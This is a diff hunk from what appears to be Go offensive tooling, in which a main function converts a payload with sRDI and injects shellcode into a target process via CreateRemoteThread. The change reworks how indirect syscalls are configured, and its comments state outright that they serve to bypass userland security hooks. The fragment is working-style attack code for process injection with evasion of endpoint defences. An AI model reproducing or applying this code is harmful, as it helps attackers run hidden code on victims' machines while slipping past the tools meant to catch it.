@@ -181,16 +181,16 @@ func main() {
         log.Fatal("srdi:", err)
     }
 
-    // Step 2: Parse target PID from args
-    var pid uint32 = 1234 // replace with real target PID
+    // Step 2: Pick the target PID
+    pid := 1234 // replace with real target PID
 
-    // Step 3: Indirect syscalls to bypass userland hooks
-    caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewTartarus())
-    defer caller.Close()
+    // Step 3: Configure the injector with indirect syscalls so every NT
+    // call bypasses userland hooks. The caller is built lazily from
+    // SyscallMethod inside the injector.
+    icfg := inject.DefaultWindowsConfig(inject.MethodCreateRemoteThread, pid)
+    icfg.SyscallMethod = wsyscall.MethodIndirect
 
     // Step 4: Inject shellcode into target process
-    icfg := inject.DefaultWindowsConfig(inject.MethodCreateRemoteThread, pid)
-    icfg.Caller = caller
     injector, err := inject.NewWindowsInjector(icfg)
     if err != nil {
         log.Fatal("inject:", err)
